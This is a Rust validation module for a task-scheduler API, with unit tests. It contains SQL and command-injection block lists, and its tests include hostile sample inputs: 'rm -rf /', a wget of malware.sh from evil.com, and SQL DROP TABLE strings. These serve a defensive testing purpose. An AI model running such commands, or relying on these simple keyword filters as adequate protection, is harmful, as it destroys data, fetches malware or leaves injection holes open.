use crate::routes::AppState;
use std::str::FromStr;
use validator::ValidationError;

/// 验证任务名称格式
pub fn validate_task_name(name: &str) -> Result<(), ValidationError> {
    if name.trim().is_empty() {
        return Err(ValidationError::new("任务名称不能为空"));
    }

    if name.len() > 255 {
        return Err(ValidationError::new("任务名称长度不能超过255个字符"));
    }

    // 检查是否只包含允许的字符：字母、数字、下划线、中划线、中文
    if !name.chars().all(|c| {
        c.is_alphanumeric()
            || c == '_'
            || c == '-'
            || c == ' '
            || c.is_ascii_punctuation()
            || ('\u{4e00}'..='\u{9fff}').contains(&c)
    }) {
        return Err(ValidationError::new("任务名称包含非法字符"));
    }

    // 检查开头和结尾是否为空格
    if name.starts_with(' ') || name.ends_with(' ') {
        return Err(ValidationError::new("任务名称不能以空格开头或结尾"));
    }

    // 检查是否包含制表符等特殊空白字符
    if name.contains('\t') || name.contains('\n') || name.contains('\r') {
        return Err(ValidationError::new("任务名称不能包含制表符或换行符"));
    }

    Ok(())
}

/// 验证任务类型格式
pub fn validate_task_type(task_type: &str) -> Result<(), ValidationError> {
    if task_type.trim().is_empty() {
        return Err(ValidationError::new("任务类型不能为空"));
    }

    if task_type.len() > 100 {
        return Err(ValidationError::new("任务类型长度不能超过100个字符"));
    }

    // 任务类型通常应该只包含字母、数字、下划线、点
    if !task_type
        .chars()
        .all(|c| c.is_alphanumeric() || c == '_' || c == '.' || c == '-')
    {
        return Err(ValidationError::new(
            "任务类型只能包含字母、数字、下划线、点和连字符",
        ));
    }

    // 不能以点或下划线开头
    if task_type.starts_with('.') || task_type.starts_with('_') {
        return Err(ValidationError::new("任务类型不能以点或下划线开头"));
    }

    Ok(())
}

/// 验证CRON表达式格式
pub fn validate_cron_expression(cron_expr: &str) -> Result<(), ValidationError> {
    if cron_expr.trim().is_empty() {
        return Err(ValidationError::new("CRON表达式不能为空"));
    }

    // 使用cron crate验证CRON表达式
    match cron::Schedule::from_str(cron_expr) {
        Ok(_) => Ok(()),
        Err(_) => Err(ValidationError::new("无效的CRON表达式")),
    }
}

/// 验证任务参数
pub fn validate_task_parameters(params: &serde_json::Value) -> Result<(), ValidationError> {
    // 检查参数大小限制（防止过大的JSON）
    if let Some(size) = get_json_size(params) {
        if size > 1024 * 1024 {
            // 1MB
            return Err(ValidationError::new("任务参数大小不能超过1MB"));
        }
    }

    // 检查参数结构是否合理
    if let Some(obj) = params.as_object() {
        // 检查键名长度
        for key in obj.keys() {
            if key.len() > 100 {
                return Err(ValidationError::new("参数键名长度不能超过100个字符"));
            }

            // 检查键名格式
            if !key
                .chars()
                .all(|c| c.is_alphanumeric() || c == '_' || c == '-' || c == '.')
            {
                return Err(ValidationError::new(
                    "参数键名只能包含字母、数字、下划线、点和连字符",
                ));
            }
        }

        // 检查是否包含敏感信息
        check_sensitive_parameters(obj)?;
    }

    Ok(())
}

/// 验证任务状态
pub fn validate_task_status(status: &str) -> Result<(), ValidationError> {
    if status.trim().is_empty() {
        return Ok(()); // 空值是允许的，表示不过滤
    }

    match status.to_uppercase().as_str() {
        "ACTIVE" | "INACTIVE" => Ok(()),
        _ => Err(ValidationError::new(
            "无效的任务状态，只能是 ACTIVE 或 INACTIVE",
        )),
    }
}

/// 验证任务运行状态
pub fn validate_task_run_status(status: &str) -> Result<(), ValidationError> {
    if status.trim().is_empty() {
        return Ok(()); // 空值是允许的，表示不过滤
    }

    match status.to_uppercase().as_str() {
        "PENDING" | "DISPATCHED" | "RUNNING" | "COMPLETED" | "FAILED" | "TIMEOUT" => Ok(()),
        _ => Err(ValidationError::new(
            "无效的任务运行状态，只能是 PENDING, DISPATCHED, RUNNING, COMPLETED, FAILED 或 TIMEOUT",
        )),
    }
}

/// 验证任务依赖
pub fn validate_dependencies(deps: &Option<Vec<i64>>) -> Result<(), ValidationError> {
    if let Some(dependencies) = deps {
        if dependencies.len() > 50 {
            return Err(ValidationError::new("任务依赖数量不能超过50个"));
        }

        // 检查是否有重复的依赖
        let unique_deps: std::collections::HashSet<_> = dependencies.iter().collect();
        if unique_deps.len() != dependencies.len() {
            return Err(ValidationError::new("任务依赖列表中存在重复项"));
        }

        // 检查依赖ID是否有效
        for &dep_id in dependencies {
            if dep_id <= 0 {
                return Err(ValidationError::new("依赖任务ID必须大于0"));
            }
        }
    }

    Ok(())
}

/// 验证创建任务请求的业务逻辑
pub async fn validate_create_task_request(
    request: &crate::handlers::tasks::CreateTaskRequest,
    _state: &AppState,
) -> Result<(), crate::error::ApiError> {
    // 检查任务名称是否包含SQL注入风险
    if contains_sql_injection_risk(&request.name) {
        return Err(crate::error::ApiError::BadRequest(
            "任务名称包含潜在的安全风险".to_string(),
        ));
    }

    // 检查任务类型是否为系统保留类型
    if is_reserved_task_type(&request.task_type) {
        return Err(crate::error::ApiError::BadRequest(
            "不能使用系统保留的任务类型".to_string(),
        ));
    }

    // 验证CRON表达式是否合理（不能过于频繁）
    if is_cron_too_frequent(&request.schedule)? {
        return Err(crate::error::ApiError::BadRequest(
            "任务调度频率过高，请调整CRON表达式".to_string(),
        ));
    }

    // 检查参数中的命令注入风险
    if contains_command_injection_risk(&request.parameters) {
        return Err(crate::error::ApiError::BadRequest(
            "任务参数包含潜在的安全风险".to_string(),
        ));
    }

    Ok(())
}

/// 验证更新任务请求的业务逻辑
pub async fn validate_update_task_request(
    request: &crate::handlers::tasks::UpdateTaskRequest,
    task_id: i64,
    state: &AppState,
) -> Result<(), crate::error::ApiError> {
    // 如果有名称，检查SQL注入风险
    if let Some(ref name) = request.name {
        if contains_sql_injection_risk(name) {
            return Err(crate::error::ApiError::BadRequest(
                "任务名称包含潜在的安全风险".to_string(),
            ));
        }
    }

    // UpdateTaskRequest doesn't have task_type field for validation

    // 如果有调度表达式，检查频率
    if let Some(ref schedule) = request.schedule {
        if is_cron_too_frequent(schedule)? {
            return Err(crate::error::ApiError::BadRequest(
                "任务调度频率过高，请调整CRON表达式".to_string(),
            ));
        }
    }

    // 如果有参数，检查命令注入风险
    if let Some(ref parameters) = request.parameters {
        if contains_command_injection_risk(parameters) {
            return Err(crate::error::ApiError::BadRequest(
                "任务参数包含潜在的安全风险".to_string(),
            ));
        }
    }

    // 如果有依赖，检查循环依赖
    if let Some(ref deps) = request.dependencies {
        if check_circular_dependency(task_id, deps, state).await? {
            return Err(crate::error::ApiError::BadRequest(
                "检测到循环依赖".to_string(),
            ));
        }
    }

    Ok(())
}

/// 验证任务依赖关系
pub async fn validate_task_dependencies(
    deps: &Option<Vec<i64>>,
    state: &AppState,
) -> Result<(), crate::error::ApiError> {
    if let Some(dependencies) = deps {
        for &dep_id in dependencies {
            // 检查依赖任务是否存在
            match state.task_repo.get_by_id(dep_id).await {
                Ok(Some(_)) => continue,
                Ok(None) => {
                    return Err(crate::error::ApiError::BadRequest(format!(
                        "依赖任务 {dep_id} 不存在"
                    )));
                }
                Err(e) => {
                    tracing::error!("Failed to check dependency task {}: {:?}", dep_id, e);
                    return Err(crate::error::ApiError::Internal(
                        "验证依赖时发生错误".to_string(),
                    ));
                }
            }
        }
    }

    Ok(())
}

// 辅助函数

/// 获取JSON大小（估算）
fn get_json_size(value: &serde_json::Value) -> Option<usize> {
    Some(value.to_string().len())
}

/// 检查敏感参数
fn check_sensitive_parameters(
    obj: &serde_json::Map<String, serde_json::Value>,
) -> Result<(), ValidationError> {
    let sensitive_keys = [
        "password",
        "secret",
        "token",
        "key",
        "auth",
        "credential",
        "private",
        "api_key",
        "access_token",
        "refresh_token",
    ];

    for key in obj.keys() {
        let lower_key = key.to_lowercase();
        if sensitive_keys
            .iter()
            .any(|sensitive| lower_key.contains(sensitive))
        {
            return Err(ValidationError::new("参数中包含敏感信息，请移除或加密存储"));
        }
    }

    Ok(())
}

/// 检查SQL注入风险
fn contains_sql_injection_risk(text: &str) -> bool {
    let sql_keywords = [
        "SELECT ", "INSERT ", "UPDATE ", "DELETE ", "DROP ", "CREATE ", "ALTER ", "UNION ",
        "WHERE ", " OR ", " AND ", "EXEC ", "EXECUTE ", "CAST ", "CONVERT ",
    ];

    let upper_text = text.to_uppercase();
    sql_keywords
        .iter()
        .any(|&keyword| upper_text.contains(keyword))
}

/// 检查命令注入风险
fn contains_command_injection_risk(params: &serde_json::Value) -> bool {
    if let Some(obj) = params.as_object() {
        for value in obj.values() {
            if let Some(s) = value.as_str() {
                let dangerous_chars = [';', '|', '&', '`', '$', '(', ')', '{', '}', '<', '>'];
                if s.chars().any(|c| dangerous_chars.contains(&c)) {
                    return true;
                }

                // 检查常见的命令
                let dangerous_commands = [
                    "rm ", "del ", "format", "shutdown", "reboot", "wget", "curl", "nc ", "netcat",
                    "python ", "perl ",
                ];
                let lower_s = s.to_lowercase();
                if dangerous_commands.iter().any(|cmd| lower_s.contains(cmd)) {
                    return true;
                }
            }
        }
    }

    false
}

/// 检查是否为系统保留任务类型
fn is_reserved_task_type(task_type: &str) -> bool {
    let reserved_types = [
        "system",
        "admin",
        "root",
        "scheduler",
        "internal",
        "__system__",
        "__internal__",
        "__admin__",
    ];

    let lower_type = task_type.to_lowercase();
    reserved_types
        .iter()
        .any(|&reserved| lower_type.starts_with(reserved))
}

/// 检查CRON表达式是否过于频繁
fn is_cron_too_frequent(cron_expr: &str) -> Result<bool, ValidationError> {
    match cron::Schedule::from_str(cron_expr) {
        Ok(schedule) => {
            // 检查是否每分钟都执行
            let _now = chrono::Utc::now();
            let mut next_executions = schedule.upcoming(chrono::Utc).take(5);

            // 如果前5次执行时间间隔都小于1分钟，则认为过于频繁
            let mut prev_time = next_executions.next();
            for current_time in next_executions {
                if let Some(prev) = prev_time {
                    let duration = current_time.signed_duration_since(prev);
                    if duration.num_seconds() < 60 {
                        return Ok(true);
                    }
                }
                prev_time = Some(current_time);
            }

            Ok(false)
        }
        Err(_) => Err(ValidationError::new("无效的CRON表达式")),
    }
}

/// 检查循环依赖
async fn check_circular_dependency(
    task_id: i64,
    dependencies: &[i64],
    state: &AppState,
) -> Result<bool, crate::error::ApiError> {
    use std::collections::{HashSet, VecDeque};

    // 使用DFS检查循环依赖
    let mut visited = HashSet::new();
    let mut recursion_stack = HashSet::new();
    let mut queue = VecDeque::new();

    // 从当前任务的依赖开始检查
    for &dep_id in dependencies {
        queue.push_back(dep_id);
    }

    while let Some(current_id) = queue.pop_front() {
        if current_id == task_id {
            return Ok(true); // 发现循环依赖
        }

        if visited.contains(&current_id) {
            continue;
        }

        visited.insert(current_id);
        recursion_stack.insert(current_id);

        // 获取当前任务的依赖
        match state.task_repo.get_by_id(current_id).await {
            Ok(Some(task)) => {
                for &dep_id in &task.dependencies {
                    if recursion_stack.contains(&dep_id) {
                        return Ok(true); // 发现循环依赖
                    }
                    if !visited.contains(&dep_id) {
                        queue.push_back(dep_id);
                    }
                }
            }
            Ok(None) => {
                // 任务不存在，跳过
            }
            Err(e) => {
                tracing::error!(
                    "Failed to check dependency for task {}: {:?}",
                    current_id,
                    e
                );
                return Err(crate::error::ApiError::Internal(
                    "检查循环依赖时发生错误".to_string(),
                ));
            }
        }

        recursion_stack.remove(&current_id);
    }

    Ok(false)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::handlers::tasks::CreateTaskRequest;
    use async_trait::async_trait;
    use scheduler_application::task_services::TaskControlService;
    use scheduler_domain::*;
    use scheduler_errors::SchedulerResult;
    use serde_json::json;

    #[test]
    fn test_validate_task_name_valid() {
        assert!(validate_task_name("test_task").is_ok());
        assert!(validate_task_name("Test Task 123").is_ok());
        assert!(validate_task_name("测试任务").is_ok());
        assert!(validate_task_name("task-with-dash").is_ok());
        assert!(validate_task_name("task_with_underscore").is_ok());
    }

    #[test]
    fn test_validate_task_name_invalid() {
        assert!(validate_task_name("").is_err());
        assert!(validate_task_name(" ").is_err());
        assert!(validate_task_name("  ").is_err());
        assert!(validate_task_name(" task").is_err());
        assert!(validate_task_name("task ").is_err());
        assert!(validate_task_name("a".repeat(256).as_str()).is_err());
        assert!(validate_task_name("task\tname").is_err());
    }

    #[test]
    fn test_validate_task_type_valid() {
        assert!(validate_task_type("shell").is_ok());
        assert!(validate_task_type("http").is_ok());
        assert!(validate_task_type("database.backup").is_ok());
        assert!(validate_task_type("task-type").is_ok());
        assert!(validate_task_type("task_type").is_ok());
    }

    #[test]
    fn test_validate_task_type_invalid() {
        assert!(validate_task_type("").is_err());
        assert!(validate_task_type(" ").is_err());
        assert!(validate_task_type(".system").is_err());
        assert!(validate_task_type("_internal").is_err());
        assert!(validate_task_type("type@with@invalid").is_err());
        assert!(validate_task_type("a".repeat(101).as_str()).is_err());
    }

    #[test]
    fn test_validate_cron_expression_valid() {
        // Test with valid CRON expressions - try 6-field format (with seconds)
        assert!(validate_cron_expression("0 * * * * *").is_ok());
        assert!(validate_cron_expression("0 0 * * * *").is_ok());
        assert!(validate_cron_expression("0 0 0 * * *").is_ok());
    }

    #[test]
    fn test_validate_cron_expression_invalid() {
        // Test empty CRON expression
        let result = validate_cron_expression("");
        assert!(result.is_err());
        let error = result.unwrap_err();
        assert_eq!(error.code, "CRON表达式不能为空");
        
        // Test invalid CRON expression
        let result = validate_cron_expression("invalid");
        assert!(result.is_err());
        let error = result.unwrap_err();
        assert_eq!(error.code, "无效的CRON表达式");
        
        // Test CRON expression with missing field
        let result = validate_cron_expression("* * * *"); // Missing field
        assert!(result.is_err());
        let error = result.unwrap_err();
        assert_eq!(error.code, "无效的CRON表达式");
        
        // Test CRON expression with invalid minute
        let result = validate_cron_expression("61 * * * *"); // Invalid minute
        assert!(result.is_err());
        let error = result.unwrap_err();
        assert_eq!(error.code, "无效的CRON表达式");
    }

    #[test]
    fn test_validate_task_parameters_valid() {
        let params = json!({"command": "echo hello", "timeout": 30});
        assert!(validate_task_parameters(&params).is_ok());

        let empty_params = json!({});
        assert!(validate_task_parameters(&empty_params).is_ok());
    }

    #[test]
    fn test_validate_task_parameters_invalid() {
        // Large JSON
        let large_value = json!({"data": "x".repeat(1024 * 1024)});
        assert!(validate_task_parameters(&large_value).is_err());

        // Invalid key name
        let invalid_key = json!({"very_long_key_name_that_exceeds_the_maximum_allowed_length_of_100_characters": "value"});
        assert!(validate_task_parameters(&invalid_key).is_err());

        // Sensitive key
        let sensitive_key = json!({"password": "secret123"});
        assert!(validate_task_parameters(&sensitive_key).is_err());
    }

    #[test]
    fn test_validate_task_status_valid() {
        assert!(validate_task_status("ACTIVE").is_ok());
        assert!(validate_task_status("inactive").is_ok());
        assert!(validate_task_status("Active").is_ok());
        assert!(validate_task_status("").is_ok()); // Empty is allowed
    }

    #[test]
    fn test_validate_task_status_invalid() {
        assert!(validate_task_status("INVALID").is_err());
        assert!(validate_task_status("unknown").is_err());
        assert!(validate_task_status("RUNNING").is_err());
    }

    #[test]
    fn test_validate_task_run_status_valid() {
        assert!(validate_task_run_status("PENDING").is_ok());
        assert!(validate_task_run_status("running").is_ok());
        assert!(validate_task_run_status("COMPLETED").is_ok());
        assert!(validate_task_run_status("").is_ok()); // Empty is allowed
    }

    #[test]
    fn test_validate_task_run_status_invalid() {
        assert!(validate_task_run_status("INVALID").is_err());
        assert!(validate_task_run_status("unknown").is_err());
        assert!(validate_task_run_status("ACTIVE").is_err());
    }

    #[test]
    fn test_validate_dependencies_valid() {
        let deps = Some(vec![1, 2, 3]);
        assert!(validate_dependencies(&deps).is_ok());

        let empty_deps = Some(vec![]);
        assert!(validate_dependencies(&empty_deps).is_ok());

        let none_deps = None;
        assert!(validate_dependencies(&none_deps).is_ok());
    }

    #[test]
    fn test_validate_dependencies_invalid() {
        // Too many dependencies
        let many_deps = Some((1..=51).collect::<Vec<i64>>());
        assert!(validate_dependencies(&many_deps).is_err());

        // Duplicate dependencies
        let duplicate_deps = Some(vec![1, 2, 2, 3]);
        assert!(validate_dependencies(&duplicate_deps).is_err());

        // Invalid dependency IDs
        let invalid_deps = Some(vec![0, -1, 1]);
        assert!(validate_dependencies(&invalid_deps).is_err());
    }

    #[test]
    fn test_contains_sql_injection_risk() {
        assert!(contains_sql_injection_risk("SELECT * FROM users"));
        assert!(contains_sql_injection_risk("DROP TABLE tasks"));
        assert!(contains_sql_injection_risk("1; DELETE FROM tasks"));
        assert!(contains_sql_injection_risk("admin' OR '1'='1"));

        assert!(!contains_sql_injection_risk("normal_task_name"));
        // Note: select and update are flagged as potential SQL injection
        // This is expected behavior for security reasons
        assert!(contains_sql_injection_risk("select data"));
        assert!(contains_sql_injection_risk("update status"));
    }

    #[test]
    fn test_contains_command_injection_risk() {
        let safe_params = json!({"command": "echo hello", "file": "test.txt"});
        assert!(!contains_command_injection_risk(&safe_params));

        let dangerous_params = json!({
            "command": "rm -rf /",
            "script": "wget http://evil.com/malware.sh",
            "cleanup": "; del *.*"
        });
        assert!(contains_command_injection_risk(&dangerous_params));
    }

    #[test]
    fn test_is_reserved_task_type() {
        assert!(is_reserved_task_type("system_task"));
        assert!(is_reserved_task_type("admin-job"));
        assert!(is_reserved_task_type("__internal__"));
        assert!(is_reserved_task_type("SystemScript"));

        assert!(!is_reserved_task_type("normal_task"));
        assert!(!is_reserved_task_type("user_script"));
        assert!(!is_reserved_task_type("backup_job"));
    }

    #[test]
    fn test_check_sensitive_parameters() {
        let safe_params = serde_json::Map::from_iter(vec![
            ("command".to_string(), json!("echo hello")),
            ("timeout".to_string(), json!(30)),
        ]);
        assert!(check_sensitive_parameters(&safe_params).is_ok());

        let sensitive_params = serde_json::Map::from_iter(vec![
            ("command".to_string(), json!("echo hello")),
            ("api_key".to_string(), json!("secret123")),
            ("user_password".to_string(), json!("pass123")),
        ]);
        assert!(check_sensitive_parameters(&sensitive_params).is_err());
    }

    #[tokio::test]
    async fn test_validate_create_task_request_valid() {
        let state = create_mock_app_state();
        let request = CreateTaskRequest {
            name: "test_task".to_string(),
            task_type: "shell".to_string(),
            schedule: "0 * * * * *".to_string(),
            parameters: json!({"command": "echo hello"}),
            timeout_seconds: Some(30),
            max_retries: Some(3),
            dependencies: None,
        };

        assert!(validate_create_task_request(&request, &state).await.is_ok());
    }

    #[tokio::test]
    async fn test_validate_create_task_request_sql_injection() {
        let state = create_mock_app_state();
        let request = CreateTaskRequest {
            name: "test'; DROP TABLE tasks; --".to_string(),
            task_type: "shell".to_string(),
            schedule: "0 * * * * *".to_string(),
            parameters: json!({"command": "echo hello"}),
            timeout_seconds: Some(30),
            max_retries: Some(3),
            dependencies: None,
        };

        assert!(validate_create_task_request(&request, &state)
            .await
            .is_err());
    }

    #[tokio::test]
    async fn test_validate_create_task_request_reserved_type() {
        let state = create_mock_app_state();
        let request = CreateTaskRequest {
            name: "test_task".to_string(),
            task_type: "system_malicious".to_string(),
            schedule: "0 * * * * *".to_string(),
            parameters: json!({"command": "echo hello"}),
            timeout_seconds: Some(30),
            max_retries: Some(3),
            dependencies: None,
        };

        assert!(validate_create_task_request(&request, &state)
            .await
            .is_err());
    }

    #[tokio::test]
    async fn test_validate_task_dependencies_nonexistent() {
        let state = create_mock_app_state();
        let deps = Some(vec![999, 1000]); // Non-existent task IDs

        let result = validate_task_dependencies(&deps, &state).await;
        assert!(result.is_err());
    }

    fn create_mock_app_state() -> AppState {
        use crate::routes::AppState;
        use std::sync::Arc;

        // Create a minimal mock state for testing
        AppState {
            task_repo: Arc::new(MockTaskRepository),
            task_run_repo: Arc::new(MockTaskRunRepository),
            worker_repo: Arc::new(MockWorkerRepository),
            task_controller: Arc::new(MockTaskController),
            auth_config: Arc::new(crate::auth::AuthConfig {
                enabled: false,
                jwt_secret: "test".to_string(),
                api_keys: std::collections::HashMap::new(),
                jwt_expiration_hours: 24,
            }),
            rate_limiter: None,
        }
    }

    // Mock implementations for testing
    struct MockTaskRepository;
    struct MockTaskRunRepository;
    struct MockWorkerRepository;
    // Mock TaskController for testing
    #[derive(Clone)]
    struct MockTaskController;

    #[async_trait::async_trait]
    impl scheduler_domain::repositories::TaskRepository for MockTaskRepository {
        async fn get_by_id(&self, id: i64) -> SchedulerResult<Option<Task>> {
            if id > 0 && id < 100 {
                Ok(Some(Task {
                    id,
                    name: format!("task_{}", id),
                    task_type: "shell".to_string(),
                    schedule: "0 * * * * *".to_string(),
                    parameters: json!({}),
                    timeout_seconds: 30,
                    max_retries: 3,
                    status: TaskStatus::Active,
                    dependencies: vec![],
                    shard_config: None,
                    created_at: chrono::Utc::now(),
                    updated_at: chrono::Utc::now(),
                }))
            } else {
                Ok(None)
            }
        }

        // Implement other required methods with minimal implementations
        async fn create(&self, _task: &Task) -> SchedulerResult<Task> {
            unimplemented!()
        }

        async fn get_by_name(&self, _name: &str) -> SchedulerResult<Option<Task>> {
            unimplemented!()
        }

        async fn update(&self, _task: &Task) -> SchedulerResult<()> {
            unimplemented!()
        }

        async fn delete(&self, _id: i64) -> SchedulerResult<()> {
            unimplemented!()
        }

        async fn list(&self, _filter: &TaskFilter) -> SchedulerResult<Vec<Task>> {
            unimplemented!()
        }

        async fn get_active_tasks(&self) -> SchedulerResult<Vec<Task>> {
            unimplemented!()
        }

        async fn get_schedulable_tasks(
            &self,
            _current_time: chrono::DateTime<chrono::Utc>,
        ) -> SchedulerResult<Vec<Task>> {
            unimplemented!()
        }

        async fn check_dependencies(&self, _task_id: i64) -> SchedulerResult<bool> {
            unimplemented!()
        }

        async fn get_dependencies(&self, _task_id: i64) -> SchedulerResult<Vec<Task>> {
            unimplemented!()
        }

        async fn batch_update_status(
            &self,
            _task_ids: &[i64],
            _status: TaskStatus,
        ) -> SchedulerResult<()> {
            unimplemented!()
        }
    }

    #[async_trait::async_trait]
    impl scheduler_domain::repositories::TaskRunRepository for MockTaskRunRepository {

        fn as_any(&self) -> &dyn std::any::Any {
            self
        }
        async fn create(&self, _task_run: &TaskRun) -> SchedulerResult<TaskRun> {
            unimplemented!()
        }

        async fn get_by_id(&self, _id: i64) -> SchedulerResult<Option<TaskRun>> {
            unimplemented!()
        }

        async fn update(&self, _task_run: &TaskRun) -> SchedulerResult<()> {
            unimplemented!()
        }

        async fn delete(&self, _id: i64) -> SchedulerResult<()> {
            unimplemented!()
        }

        async fn get_by_task_id(&self, _task_id: i64) -> SchedulerResult<Vec<TaskRun>> {
            unimplemented!()
        }

        async fn get_by_worker_id(&self, _worker_id: &str) -> SchedulerResult<Vec<TaskRun>> {
            unimplemented!()
        }

        async fn get_by_status(&self, _status: TaskRunStatus) -> SchedulerResult<Vec<TaskRun>> {
            unimplemented!()
        }

        async fn get_pending_runs(&self, _limit: Option<i64>) -> SchedulerResult<Vec<TaskRun>> {
            unimplemented!()
        }

        async fn get_running_runs(&self) -> SchedulerResult<Vec<TaskRun>> {
            unimplemented!()
        }

        async fn get_timeout_runs(&self, _timeout_seconds: i64) -> SchedulerResult<Vec<TaskRun>> {
            unimplemented!()
        }

        async fn update_status(
            &self,
            _id: i64,
            _status: TaskRunStatus,
            _worker_id: Option<&str>,
        ) -> SchedulerResult<()> {
            unimplemented!()
        }

        async fn update_result(
            &self,
            _id: i64,
            _result: Option<&str>,
            _error_message: Option<&str>,
        ) -> SchedulerResult<()> {
            unimplemented!()
        }

        async fn get_recent_runs(
            &self,
            _task_id: i64,
            _limit: i64,
        ) -> SchedulerResult<Vec<TaskRun>> {
            unimplemented!()
        }

        async fn get_execution_stats(
            &self,
            _task_id: i64,
            _days: i32,
        ) -> SchedulerResult<scheduler_domain::repositories::TaskExecutionStats> {
            unimplemented!()
        }

        async fn cleanup_old_runs(&self, _days: i32) -> SchedulerResult<u64> {
            unimplemented!()
        }

        async fn batch_update_status(
            &self,
            _run_ids: &[i64],
            _status: TaskRunStatus,
        ) -> SchedulerResult<()> {
            unimplemented!()
        }
    }

    #[async_trait::async_trait]
    impl scheduler_domain::repositories::WorkerRepository for MockWorkerRepository {
        async fn register(&self, _worker: &WorkerInfo) -> SchedulerResult<()> {
            unimplemented!()
        }

        async fn unregister(&self, _worker_id: &str) -> SchedulerResult<()> {
            unimplemented!()
        }

        async fn get_by_id(&self, _worker_id: &str) -> SchedulerResult<Option<WorkerInfo>> {
            unimplemented!()
        }

        async fn update(&self, _worker: &WorkerInfo) -> SchedulerResult<()> {
            unimplemented!()
        }

        async fn list(&self) -> SchedulerResult<Vec<WorkerInfo>> {
            unimplemented!()
        }

        async fn get_alive_workers(&self) -> SchedulerResult<Vec<WorkerInfo>> {
            unimplemented!()
        }

        async fn get_workers_by_task_type(
            &self,
            _task_type: &str,
        ) -> SchedulerResult<Vec<WorkerInfo>> {
            unimplemented!()
        }

        async fn update_heartbeat(
            &self,
            _worker_id: &str,
            _heartbeat_time: chrono::DateTime<chrono::Utc>,
            _current_task_count: i32,
        ) -> SchedulerResult<()> {
            unimplemented!()
        }

        async fn update_status(
            &self,
            _worker_id: &str,
            _status: WorkerStatus,
        ) -> SchedulerResult<()> {
            unimplemented!()
        }

        async fn get_timeout_workers(
            &self,
            _timeout_seconds: i64,
        ) -> SchedulerResult<Vec<WorkerInfo>> {
            unimplemented!()
        }

        async fn cleanup_offline_workers(&self, _timeout_seconds: i64) -> SchedulerResult<u64> {
            unimplemented!()
        }

        async fn get_worker_load_stats(
            &self,
        ) -> SchedulerResult<Vec<scheduler_domain::repositories::WorkerLoadStats>> {
            unimplemented!()
        }

        async fn batch_update_status(
            &self,
            _worker_ids: &[String],
            _status: WorkerStatus,
        ) -> SchedulerResult<()> {
            unimplemented!()
        }
    }

    // Simple mock implementation for testing
    #[async_trait]
    impl TaskControlService for MockTaskController {
        async fn trigger_task(&self, _task_id: i64) -> SchedulerResult<TaskRun> {
            unimplemented!()
        }

        async fn pause_task(&self, _task_id: i64) -> SchedulerResult<()> {
            unimplemented!()
        }

        async fn resume_task(&self, _task_id: i64) -> SchedulerResult<()> {
            unimplemented!()
        }

        async fn restart_task_run(&self, _task_run_id: i64) -> SchedulerResult<TaskRun> {
            unimplemented!()
        }

        async fn abort_task_run(&self, _task_run_id: i64) -> SchedulerResult<()> {
            unimplemented!()
        }

        async fn cancel_all_task_runs(&self, _task_id: i64) -> SchedulerResult<usize> {
            unimplemented!()
        }

        async fn has_running_instances(&self, _task_id: i64) -> SchedulerResult<bool> {
            Ok(false) // Return false for mock
        }

        async fn get_recent_executions(
            &self,
            _task_id: i64,
            _limit: usize,
        ) -> SchedulerResult<Vec<TaskRun>> {
            unimplemented!()
        }
    }
}
